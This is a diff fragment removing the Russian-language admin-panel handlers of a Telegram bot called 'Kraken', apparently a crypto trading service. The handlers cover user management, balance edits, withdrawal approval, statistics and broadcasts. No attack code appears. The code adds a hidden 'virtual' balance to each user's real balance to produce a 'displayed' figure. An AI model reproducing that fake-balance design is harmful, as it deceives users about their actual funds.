-            # Admin: Main menu
-            elif data == "adm:menu":
-                if str(chat_id) == str(ADMIN_ID):
-                    admin_states.pop(str(chat_id), None)
-                    msg_id = cq["message"]["message_id"]
-                    admin_text = """🔐 <b>Админ панель Kraken</b>
 
-Добро пожаловать в панель управления!
-Выберите раздел для управления:"""
-                    admin_buttons = [
-                        [{"text": "👥 Пользователи", "callback_data": "adm:users:page:1"}, {"text": "💸 Выводы", "callback_data": "adm:withdrawals:menu"}],
-                        [{"text": "📊 Статистика", "callback_data": "adm:stats:menu"}, {"text": "📣 Рассылка", "callback_data": "adm:broadcast:menu"}],
-                        [{"text": "⚙️ Управление", "callback_data": "adm:manage:menu"}, {"text": "⬅️ Выйти", "callback_data": "adm:exit"}]
-                    ]
-                    await bot_edit_message(chat_id, msg_id, admin_text, admin_buttons)
-            
-            # Admin: Exit to user menu
-            elif data == "adm:exit":
-                if str(chat_id) == str(ADMIN_ID):
-                    admin_states.pop(str(chat_id), None)
-                    await bot_send_message(chat_id, "✅ Вы вышли из админ панели.\nИспользуйте /admin для возврата.")
-            
-            # Admin: Users list with pagination
-            elif data.startswith("adm:users:page:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    page = int(data.split(":")[3])
-                    per_page = 10
-                    offset = (page - 1) * per_page
-                    
-                    total_users = (await db.execute(select(func.count(User.id)))).scalar()
-                    users = (await db.execute(select(User).order_by(User.created_at.desc()).offset(offset).limit(per_page))).scalars().all()
-                    
-                    total_pages = (total_users + per_page - 1) // per_page
-                    
-                    msg = f"👥 <b>Пользователи</b> ({total_users})\n📄 Страница {page}/{total_pages}\n\nВыберите пользователя:"
-                    
-                    buttons = []
-                    for u in users:
-                        status = ""
-                        if u.is_blocked: status += "🚫"
-                        if u.is_verified: status += "✅"
-                        if u.is_premium: status += "⭐"
-                        username = u.username or "Аноним"
-                        btn_text = f"{username} (ID: {u.profile_id}) {status}"
-                        buttons.append([{"text": btn_text, "callback_data": f"adm:user:open:{u.profile_id}"}])
-                    
-                    nav_row = []
-                    if page > 1:
-                        nav_row.append({"text": "◀️", "callback_data": f"adm:users:page:{page-1}"})
-                    nav_row.append({"text": f"{page}/{total_pages}", "callback_data": "adm:noop"})
-                    if page < total_pages:
-                        nav_row.append({"text": "▶️", "callback_data": f"adm:users:page:{page+1}"})
-                    if nav_row:
-                        buttons.append(nav_row)
-                    
-                    buttons.append([{"text": "🔍 Поиск по ID", "callback_data": "adm:users:search"}])
-                    buttons.append([{"text": "⬅️ Назад", "callback_data": "adm:menu"}])
-                    
-                    await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Search user by ID
-            elif data == "adm:users:search":
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    admin_states[str(chat_id)] = {"state": "awaiting_search_id", "message_id": msg_id}
-                    msg = "🔍 <b>Поиск пользователя</b>\n\nВведите Profile ID пользователя:"
-                    buttons = [[{"text": "❌ Отмена", "callback_data": "adm:users:page:1"}]]
-                    await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Open user profile
-            elif data.startswith("adm:user:open:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    profile_id = int(data.split(":")[3])
-                    user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                    
-                    if not user:
-                        await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден")
-                        return {"ok": True}
-                    
-                    verify_icon = "✅" if user.is_verified else "❌"
-                    premium_icon = "⭐" if user.is_premium else "❌"
-                    block_icon = "🚫" if user.is_blocked else "✅"
-                    displayed_bal = (user.balance_usdt or 0) + (user.virtual_balance or 0)
-                    
-                    msg = f"👤 <b>Пользователь #{profile_id}</b>\n\n"
-                    msg += f"📛 Username: @{user.username or 'N/A'}\n"
-                    msg += f"🆔 Telegram: {user.telegram_id}\n"
-                    msg += f"💰 Баланс: {displayed_bal:.2f} USDT\n"
-                    msg += f"   💎 Реальный: {user.balance_usdt:.2f}\n"
-                    msg += f"   🎭 Виртуальный: {user.virtual_balance:.2f}\n"
-                    msg += f"✅ Верификация: {verify_icon}\n"
-                    msg += f"⭐ Premium: {premium_icon}\n"
-                    msg += f"🔒 Статус: {block_icon}\n"
-                    if user.is_blocked and user.block_reason:
-                        msg += f"📝 Причина: {user.block_reason}\n"
-                    msg += f"📅 Регистрация: {user.created_at.strftime('%d.%m.%Y') if user.created_at else 'N/A'}"
-                    
-                    block_btn = "✅ Разблокировать" if user.is_blocked else "🚫 Заблокировать"
-                    buttons = [
-                        [{"text": "💬 Написать", "callback_data": f"adm:user:msg:{profile_id}"}, {"text": "💰 Баланс", "callback_data": f"adm:user:bal:{profile_id}"}],
-                        [{"text": "⭐ Premium", "callback_data": f"adm:user:prem:{profile_id}"}, {"text": "✅ Верификация", "callback_data": f"adm:user:verify:{profile_id}"}],
-                        [{"text": block_btn, "callback_data": f"adm:user:block:{profile_id}"}, {"text": "🧾 История", "callback_data": f"adm:user:history:{profile_id}"}],
-                        [{"text": "⬅️ Назад", "callback_data": "adm:users:page:1"}]
-                    ]
-                    await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Toggle premium
-            elif data.startswith("adm:user:prem:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    profile_id = int(data.split(":")[3])
-                    user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                    if user:
-                        old_val = user.is_premium
-                        user.is_premium = not user.is_premium
-                        await db.commit()
-                        await log_admin_action(db, str(ADMIN_ID), "toggle_premium", user.id, str(old_val), str(user.is_premium))
-                        status = "⭐ Premium активирован" if user.is_premium else "❌ Premium отключен"
-                        msg = f"👤 <b>Пользователь #{profile_id}</b>\n\n{status}"
-                        buttons = [[{"text": "⬅️ К профилю", "callback_data": f"adm:user:open:{profile_id}"}]]
-                        await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Toggle verification
-            elif data.startswith("adm:user:verify:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    profile_id = int(data.split(":")[3])
-                    user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                    if user:
-                        old_val = user.is_verified
-                        user.is_verified = not user.is_verified
-                        await db.commit()
-                        await log_admin_action(db, str(ADMIN_ID), "toggle_verification", user.id, str(old_val), str(user.is_verified))
-                        status = "✅ Верифицирован" if user.is_verified else "❌ Верификация снята"
-                        msg = f"👤 <b>Пользователь #{profile_id}</b>\n\n{status}"
-                        buttons = [[{"text": "⬅️ К профилю", "callback_data": f"adm:user:open:{profile_id}"}]]
-                        await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Block/unblock user
-            elif data.startswith("adm:user:block:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    profile_id = int(data.split(":")[3])
-                    user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                    if user:
-                        if user.is_blocked:
-                            old_val = f"blocked: {user.block_reason}"
-                            user.is_blocked = False
-                            user.block_reason = None
-                            await db.commit()
-                            await log_admin_action(db, str(ADMIN_ID), "unblock_user", user.id, old_val, "unblocked")
-                            msg = f"✅ <b>Пользователь #{profile_id} разблокирован</b>"
-                            try:
-                                await bot_send_message(int(user.telegram_id), "✅ Ваш аккаунт разблокирован. Добро пожаловать!")
-                            except: pass
-                            buttons = [[{"text": "⬅️ К профилю", "callback_data": f"adm:user:open:{profile_id}"}]]
-                            await bot_edit_message(chat_id, msg_id, msg, buttons)
-                        else:
-                            admin_states[str(chat_id)] = {"state": "awaiting_reason", "action": "block", "user_id": profile_id, "message_id": msg_id}
-                            msg = f"🚫 <b>Блокировка пользователя #{profile_id}</b>\n\nВведите причину блокировки:"
-                            buttons = [[{"text": "❌ Отмена", "callback_data": f"adm:user:open:{profile_id}"}]]
-                            await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Balance management
-            elif data.startswith("adm:user:bal:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    profile_id = int(data.split(":")[3])
-                    user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                    if user:
-                        displayed_bal = (user.balance_usdt or 0) + (user.virtual_balance or 0)
-                        msg = f"💰 <b>Баланс пользователя #{profile_id}</b>\n\n"
-                        msg += f"📊 Отображаемый: {displayed_bal:.2f} USDT\n"
-                        msg += f"💎 Реальный: {user.balance_usdt:.2f} USDT\n"
-                        msg += f"🎭 Виртуальный: {user.virtual_balance:.2f} USDT\n\n"
-                        msg += "Выберите действие:"
-                        
-                        buttons = [
-                            [{"text": "➕ Добавить", "callback_data": f"adm:user:bal:add:{profile_id}"}, {"text": "➖ Списать", "callback_data": f"adm:user:bal:sub:{profile_id}"}],
-                            [{"text": "🎯 Установить", "callback_data": f"adm:user:bal:set:{profile_id}"}],
-                            [{"text": "⬅️ Назад", "callback_data": f"adm:user:open:{profile_id}"}]
-                        ]
-                        await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Balance add
-            elif data.startswith("adm:user:bal:add:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    profile_id = int(data.split(":")[4])
-                    admin_states[str(chat_id)] = {"state": "awaiting_amount", "action": "add", "user_id": profile_id, "message_id": msg_id}
-                    msg = f"➕ <b>Добавить к балансу #{profile_id}</b>\n\nВведите сумму в USDT:"
-                    buttons = [[{"text": "❌ Отмена", "callback_data": f"adm:user:bal:{profile_id}"}]]
-                    await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Balance subtract
-            elif data.startswith("adm:user:bal:sub:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    profile_id = int(data.split(":")[4])
-                    admin_states[str(chat_id)] = {"state": "awaiting_amount", "action": "subtract", "user_id": profile_id, "message_id": msg_id}
-                    msg = f"➖ <b>Списать с баланса #{profile_id}</b>\n\nВведите сумму в USDT:"
-                    buttons = [[{"text": "❌ Отмена", "callback_data": f"adm:user:bal:{profile_id}"}]]
-                    await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Balance set
-            elif data.startswith("adm:user:bal:set:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    profile_id = int(data.split(":")[4])
-                    admin_states[str(chat_id)] = {"state": "awaiting_amount", "action": "set", "user_id": profile_id, "message_id": msg_id}
-                    msg = f"🎯 <b>Установить баланс #{profile_id}</b>\n\nВведите новую сумму в USDT:"
-                    buttons = [[{"text": "❌ Отмена", "callback_data": f"adm:user:bal:{profile_id}"}]]
-                    await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Confirm balance change
-            elif data.startswith("adm:user:bal:confirm:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    parts = data.split(":")
-                    action = parts[4]
-                    profile_id = int(parts[5])
-                    amount = float(parts[6])
-                    
-                    user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                    if user:
-                        old_bal = user.balance_usdt or 0
-                        
-                        if action == "add":
-                            user.balance_usdt = old_bal + amount
-                            operation = f"Добавлено +{amount:.2f}"
-                        elif action == "subtract":
-                            if old_bal < amount:
-                                msg = f"❌ Недостаточно средств!\n\nТекущий баланс: {old_bal:.2f} USDT"
-                                buttons = [[{"text": "⬅️ Назад", "callback_data": f"adm:user:bal:{profile_id}"}]]
-                                await bot_edit_message(chat_id, msg_id, msg, buttons)
-                                return {"ok": True}
-                            user.balance_usdt = old_bal - amount
-                            operation = f"Списано -{amount:.2f}"
-                        else:
-                            user.balance_usdt = amount
-                            operation = f"Установлено {amount:.2f}"
-                        
-                        new_bal = user.balance_usdt
-                        await db.commit()
-                        await log_admin_action(db, str(ADMIN_ID), f"balance_{action}", user.id, f"{old_bal:.2f}", f"{new_bal:.2f}")
-                        
-                        try:
-                            if action == "add":
-                                await bot_send_message(int(user.telegram_id), f"💰 <b>Баланс пополнен!</b>\n\n✅ Зачислено: {amount:.2f} USDT\n💵 Новый баланс: {new_bal:.2f} USDT")
-                            elif action == "subtract":
-                                await bot_send_message(int(user.telegram_id), f"💸 <b>Списание с баланса</b>\n\n📉 Списано: {amount:.2f} USDT\n💵 Новый баланс: {new_bal:.2f} USDT")
-                        except: pass
-                        
-                        msg = f"✅ <b>Баланс изменен!</b>\n\n👤 Пользователь: #{profile_id}\n💰 Было: {old_bal:.2f} USDT\n📊 {operation} USDT\n💎 Стало: {new_bal:.2f} USDT"
-                        buttons = [[{"text": "⬅️ К профилю", "callback_data": f"adm:user:open:{profile_id}"}]]
-                        await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Write message to user
-            elif data.startswith("adm:user:msg:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    profile_id = int(data.split(":")[3])
-                    admin_states[str(chat_id)] = {"state": "awaiting_message", "user_id": profile_id, "message_id": msg_id}
-                    msg = f"💬 <b>Сообщение пользователю #{profile_id}</b>\n\nВведите текст сообщения:"
-                    buttons = [[{"text": "❌ Отмена", "callback_data": f"adm:user:open:{profile_id}"}]]
-                    await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Send message confirm
-            elif data.startswith("adm:user:msg:send:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    profile_id = int(data.split(":")[4])
-                    state = admin_states.get(str(chat_id), {})
-                    message_text = state.get("data", {}).get("message", "")
-                    
-                    user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                    if user and message_text:
-                        try:
-                            await bot_send_message(int(user.telegram_id), f"📨 <b>Сообщение от администрации:</b>\n\n{message_text}")
-                            await log_admin_action(db, str(ADMIN_ID), "send_message", user.id, None, message_text[:100])
-                            msg = f"✅ <b>Сообщение отправлено!</b>\n\n👤 Получатель: #{profile_id}\n📝 Текст: {message_text[:100]}..."
-                        except Exception as e:
-                            msg = f"❌ Ошибка отправки: {str(e)}"
-                    else:
-                        msg = "❌ Ошибка: текст сообщения не найден"
-                    
-                    admin_states.pop(str(chat_id), None)
-                    buttons = [[{"text": "⬅️ К профилю", "callback_data": f"adm:user:open:{profile_id}"}]]
-                    await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: User history
-            elif data.startswith("adm:user:history:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    profile_id = int(data.split(":")[3])
-                    user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                    if user:
-                        txns = (await db.execute(select(Transaction).where(Transaction.user_id == user.id).order_by(Transaction.created_at.desc()).limit(10))).scalars().all()
-                        
-                        msg = f"🧾 <b>История #{profile_id}</b>\n\n"
-                        if txns:
-                            for t in txns:
-                                emoji = "📥" if t.type == "deposit" else "📤" if t.type in ("withdrawal", "withdraw") else "🔄"
-                                date = t.created_at.strftime('%d.%m %H:%M') if t.created_at else "?"
-                                msg += f"{emoji} {t.type}: {t.amount:.2f} {t.currency} [{t.status}]\n   📅 {date}\n\n"
-                        else:
-                            msg += "Транзакций нет"
-                        
-                        buttons = [[{"text": "⬅️ К профилю", "callback_data": f"adm:user:open:{profile_id}"}]]
-                        await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Withdrawals menu
-            elif data == "adm:withdrawals:menu":
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    pending_count = (await db.execute(select(func.count(Withdrawal.id)).where(Withdrawal.status == "pending"))).scalar() or 0
-                    
-                    msg = f"💸 <b>Выводы</b>\n\n⏳ Ожидающие: {pending_count}"
-                    buttons = [
-                        [{"text": f"⏳ Ожидающие ({pending_count})", "callback_data": "adm:withdrawals:pending:1"}],
-                        [{"text": "📜 История", "callback_data": "adm:withdrawals:history:1"}],
-                        [{"text": "⬅️ Назад", "callback_data": "adm:menu"}]
-                    ]
-                    await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Pending withdrawals with pagination
-            elif data.startswith("adm:withdrawals:pending:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    page = int(data.split(":")[3])
-                    per_page = 5
-                    offset = (page - 1) * per_page
-                    
-                    total = (await db.execute(select(func.count(Withdrawal.id)).where(Withdrawal.status == "pending"))).scalar() or 0
-                    withdrawals = (await db.execute(select(Withdrawal).where(Withdrawal.status == "pending").order_by(Withdrawal.created_at.desc()).offset(offset).limit(per_page))).scalars().all()
-                    
-                    total_pages = max(1, (total + per_page - 1) // per_page)
-                    
-                    msg = f"⏳ <b>Ожидающие выводы</b> ({total})\n📄 Страница {page}/{total_pages}\n\n"
-                    
-                    buttons = []
-                    for w in withdrawals:
-                        user = (await db.execute(select(User).where(User.id == w.user_id))).scalars().first()
-                        username = user.username if user else "N/A"
-                        profile_id = user.profile_id if user else "?"
-                        msg += f"#{w.id} | #{profile_id} @{username}\n💰 {w.amount_rub:,.0f} ₽ → *{w.card_number}\n\n"
-                        buttons.append([
-                            {"text": f"✅ #{w.id}", "callback_data": f"adm:wd:approve:{w.id}"},
-                            {"text": f"❌ #{w.id}", "callback_data": f"adm:wd:reject:{w.id}"},
-                            {"text": f"👤", "callback_data": f"adm:user:open:{profile_id}"}
-                        ])
-                    
-                    if not withdrawals:
-                        msg += "✅ Нет ожидающих выводов"
-                    
-                    nav_row = []
-                    if page > 1:
-                        nav_row.append({"text": "◀️", "callback_data": f"adm:withdrawals:pending:{page-1}"})
-                    nav_row.append({"text": f"{page}/{total_pages}", "callback_data": "adm:noop"})
-                    if page < total_pages:
-                        nav_row.append({"text": "▶️", "callback_data": f"adm:withdrawals:pending:{page+1}"})
-                    if nav_row:
-                        buttons.append(nav_row)
-                    
-                    buttons.append([{"text": "⬅️ Назад", "callback_data": "adm:withdrawals:menu"}])
-                    await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Withdrawal history
-            elif data.startswith("adm:withdrawals:history:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    page = int(data.split(":")[3])
-                    per_page = 5
-                    offset = (page - 1) * per_page
-                    
-                    total = (await db.execute(select(func.count(Withdrawal.id)).where(Withdrawal.status != "pending"))).scalar() or 0
-                    withdrawals = (await db.execute(select(Withdrawal).where(Withdrawal.status != "pending").order_by(Withdrawal.created_at.desc()).offset(offset).limit(per_page))).scalars().all()
-                    
-                    total_pages = max(1, (total + per_page - 1) // per_page)
-                    
-                    msg = f"📜 <b>История выводов</b> ({total})\n📄 Страница {page}/{total_pages}\n\n"
-                    
-                    for w in withdrawals:
-                        user = (await db.execute(select(User).where(User.id == w.user_id))).scalars().first()
-                        profile_id = user.profile_id if user else "?"
-                        status_icon = "✅" if w.status == "completed" else "❌" if w.status == "cancelled" else "⏳"
-                        msg += f"{status_icon} #{w.id} | #{profile_id} | {w.amount_rub:,.0f} ₽ | {w.status}\n"
-                    
-                    if not withdrawals:
-                        msg += "История пуста"
-                    
-                    buttons = []
-                    nav_row = []
-                    if page > 1:
-                        nav_row.append({"text": "◀️", "callback_data": f"adm:withdrawals:history:{page-1}"})
-                    nav_row.append({"text": f"{page}/{total_pages}", "callback_data": "adm:noop"})
-                    if page < total_pages:
-                        nav_row.append({"text": "▶️", "callback_data": f"adm:withdrawals:history:{page+1}"})
-                    if nav_row:
-                        buttons.append(nav_row)
-                    
-                    buttons.append([{"text": "⬅️ Назад", "callback_data": "adm:withdrawals:menu"}])
-                    await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Approve withdrawal
-            elif data.startswith("adm:wd:approve:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    wd_id = int(data.split(":")[3])
-                    withdrawal = (await db.execute(select(Withdrawal).where(Withdrawal.id == wd_id))).scalars().first()
-                    if withdrawal and withdrawal.status == "pending":
-                        user = (await db.execute(select(User).where(User.id == withdrawal.user_id))).scalars().first()
-                        withdrawal.status = "completed"
-                        withdrawal.completed_at = datetime.utcnow()
-                        await db.commit()
-                        await log_admin_action(db, str(ADMIN_ID), "approve_withdrawal", withdrawal.user_id, f"pending", f"completed", details={"wd_id": wd_id, "amount": withdrawal.amount_rub})
-                        
-                        if user:
-                            try:
-                                await bot_send_message(int(user.telegram_id), f"✅ <b>Вывод одобрен!</b>\n\n💰 Сумма: {withdrawal.amount_rub:,.0f} ₽\n💳 На карту: **** {withdrawal.card_number}")
-                            except: pass
-                        
-                        msg = f"✅ <b>Вывод #{wd_id} одобрен!</b>"
-                    else:
-                        msg = "❌ Вывод не найден или уже обработан"
-                    
-                    buttons = [[{"text": "⬅️ К выводам", "callback_data": "adm:withdrawals:pending:1"}]]
-                    await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Reject withdrawal
-            elif data.startswith("adm:wd:reject:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    wd_id = int(data.split(":")[3])
-                    withdrawal = (await db.execute(select(Withdrawal).where(Withdrawal.id == wd_id))).scalars().first()
-                    if withdrawal and withdrawal.status == "pending":
-                        user = (await db.execute(select(User).where(User.id == withdrawal.user_id))).scalars().first()
-                        
-                        refund = withdrawal.usdt_required
-                        if user:
-                            user.balance_usdt = (user.balance_usdt or 0) + refund
-                        
-                        withdrawal.status = "cancelled"
-                        await db.commit()
-                        await log_admin_action(db, str(ADMIN_ID), "reject_withdrawal", withdrawal.user_id, f"pending", f"cancelled", details={"wd_id": wd_id, "refund": refund})
-                        
-                        if user:
-                            try:
-                                await bot_send_message(int(user.telegram_id), f"❌ <b>Вывод отклонен</b>\n\n💰 Сумма: {withdrawal.amount_rub:,.0f} ₽\n✅ {refund:.4f} USDT возвращены на баланс")
-                            except: pass
-                        
-                        msg = f"❌ <b>Вывод #{wd_id} отклонен!</b>\n✅ {refund:.4f} USDT возвращены"
-                    else:
-                        msg = "❌ Вывод не найден или уже обработан"
-                    
-                    buttons = [[{"text": "⬅️ К выводам", "callback_data": "adm:withdrawals:pending:1"}]]
-                    await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Statistics menu
-            elif data == "adm:stats:menu":
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    msg = "📊 <b>Статистика</b>\n\nВыберите период:"
-                    buttons = [
-                        [{"text": "📅 Сегодня", "callback_data": "adm:stats:today"}, {"text": "📆 Неделя", "callback_data": "adm:stats:week"}],
-                        [{"text": "🗓 Месяц", "callback_data": "adm:stats:month"}, {"text": "📈 Всё время", "callback_data": "adm:stats:all"}],
-                        [{"text": "⬅️ Назад", "callback_data": "adm:menu"}]
-                    ]
-                    await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Statistics by period
-            elif data.startswith("adm:stats:") and data.split(":")[2] in ["today", "week", "month", "all"]:
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    period = data.split(":")[2]
-                    
-                    now = datetime.utcnow()
-                    if period == "today":
-                        start_date = now.replace(hour=0, minute=0, second=0, microsecond=0)
-                        period_name = "Сегодня"
-                    elif period == "week":
-                        start_date = now - timedelta(days=7)
-                        period_name = "За неделю"
-                    elif period == "month":
-                        start_date = now - timedelta(days=30)
-                        period_name = "За месяц"
-                    else:
-                        start_date = datetime(2020, 1, 1)
-                        period_name = "Всё время"
-                    
-                    total_users = (await db.execute(select(func.count(User.id)))).scalar() or 0
-                    new_users = (await db.execute(select(func.count(User.id)).where(User.created_at >= start_date))).scalar() or 0
-                    
-                    total_deposits = (await db.execute(select(func.sum(Transaction.amount)).where(Transaction.type == "deposit", Transaction.status == "done", Transaction.created_at >= start_date))).scalar() or 0
-                    total_withdrawals = (await db.execute(select(func.sum(Withdrawal.amount_rub)).where(Withdrawal.status == "completed", Withdrawal.created_at >= start_date))).scalar() or 0
-                    
-                    total_trades = (await db.execute(select(func.count(Trade.id)).where(Trade.created_at >= start_date if hasattr(Trade, 'created_at') else Trade.opened_at >= start_date))).scalar() or 0
-                    active_trades = (await db.execute(select(func.count(Trade.id)).where(Trade.status == "active"))).scalar() or 0
-                    
-                    pending_wd = (await db.execute(select(func.count(Withdrawal.id)).where(Withdrawal.status == "pending"))).scalar() or 0
-                    
-                    msg = f"📊 <b>Статистика: {period_name}</b>\n\n"
-                    msg += f"👥 Всего пользователей: <b>{total_users}</b>\n"
-                    msg += f"🆕 Новых за период: <b>{new_users}</b>\n\n"
-                    msg += f"💰 Депозитов: <b>{total_deposits:.2f} USDT</b>\n"
-                    msg += f"💸 Выводов: <b>{total_withdrawals:,.0f} ₽</b>\n"
-                    msg += f"⏳ Ожидает вывода: <b>{pending_wd}</b>\n\n"
-                    msg += f"📈 Всего сделок: <b>{total_trades}</b>\n"
-                    msg += f"🔥 Активных: <b>{active_trades}</b>"
-                    
-                    buttons = [
-                        [{"text": "📅 Сегодня", "callback_data": "adm:stats:today"}, {"text": "📆 Неделя", "callback_data": "adm:stats:week"}],
-                        [{"text": "🗓 Месяц", "callback_data": "adm:stats:month"}, {"text": "📈 Всё время", "callback_data": "adm:stats:all"}],
-                        [{"text": "⬅️ Назад", "callback_data": "adm:menu"}]
-                    ]
-                    await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Broadcast menu
-            elif data == "adm:broadcast:menu":
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    total_users = (await db.execute(select(func.count(User.id)))).scalar() or 0
-                    
-                    msg = f"📣 <b>Рассылка</b>\n\n👥 Всего пользователей: {total_users}\n\nВведите текст сообщения для рассылки:"
-                    admin_states[str(chat_id)] = {"state": "awaiting_broadcast", "message_id": msg_id}
-                    buttons = [[{"text": "❌ Отмена", "callback_data": "adm:menu"}]]
-                    await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Broadcast confirm
-            elif data == "adm:broadcast:confirm":
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    state = admin_states.get(str(chat_id), {})
-                    broadcast_text = state.get("data", {}).get("message", "")
-                    
-                    if not broadcast_text:
-                        msg = "❌ Текст рассылки не найден"
-                        buttons = [[{"text": "⬅️ Назад", "callback_data": "adm:menu"}]]
-                        await bot_edit_message(chat_id, msg_id, msg, buttons)
-                        return {"ok": True}
-                    
-                    users = (await db.execute(select(User))).scalars().all()
-                    sent = 0
-                    failed = 0
-                    
-                    for user in users:
-                        try:
-                            await bot_send_message(int(user.telegram_id), f"📣 <b>Объявление:</b>\n\n{broadcast_text}")
-                            sent += 1
-                        except:
-                            failed += 1
-                    
-                    await log_admin_action(db, str(ADMIN_ID), "broadcast", None, None, broadcast_text[:100], details={"sent": sent, "failed": failed})
-                    admin_states.pop(str(chat_id), None)
-                    
-                    msg = f"✅ <b>Рассылка завершена!</b>\n\n📨 Отправлено: {sent}\n❌ Ошибок: {failed}"
-                    buttons = [[{"text": "⬅️ В меню", "callback_data": "adm:menu"}]]
-                    await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Management menu
-            elif data == "adm:manage:menu":
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    msg = "⚙️ <b>Управление</b>\n\nВыберите раздел:"
-                    buttons = [
-                        [{"text": "📒 Логи действий", "callback_data": "adm:logs:page:1"}],
-                        [{"text": "🎫 Чеки", "callback_data": "adm:checks:menu"}],
-                        [{"text": "⬅️ Назад", "callback_data": "adm:menu"}]
-                    ]
-                    await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Logs
-            elif data.startswith("adm:logs:page:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    page = int(data.split(":")[3])
-                    per_page = 10
-                    offset = (page - 1) * per_page
-                    
-                    total = (await db.execute(select(func.count(AdminLog.id)))).scalar() or 0
-                    logs = (await db.execute(select(AdminLog).order_by(AdminLog.created_at.desc()).offset(offset).limit(per_page))).scalars().all()
-                    
-                    total_pages = max(1, (total + per_page - 1) // per_page)
-                    
-                    msg = f"📒 <b>Логи действий</b> ({total})\n📄 Страница {page}/{total_pages}\n\n"
-                    
-                    for log in logs:
-                        date = log.created_at.strftime('%d.%m %H:%M') if log.created_at else "?"
-                        user_info = f"User #{log.user_id}" if log.user_id else "System"
-                        msg += f"📌 {log.action} | {user_info}\n   📅 {date}\n"
-                    
-                    if not logs:
-                        msg += "Логов нет"
-                    
-                    buttons = []
-                    nav_row = []
-                    if page > 1:
-                        nav_row.append({"text": "◀️", "callback_data": f"adm:logs:page:{page-1}"})
-                    nav_row.append({"text": f"{page}/{total_pages}", "callback_data": "adm:noop"})
-                    if page < total_pages:
-                        nav_row.append({"text": "▶️", "callback_data": f"adm:logs:page:{page+1}"})
-                    if nav_row:
-                        buttons.append(nav_row)
-                    
-                    buttons.append([{"text": "⬅️ Назад", "callback_data": "adm:manage:menu"}])
-                    await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: Checks menu
-            elif data == "adm:checks:menu":
-                if str(chat_id) == str(ADMIN_ID):
-                    msg_id = cq["message"]["message_id"]
-                    active_checks = (await db.execute(select(func.count(Check.id)).where(Check.status == "active"))).scalar() or 0
-                    
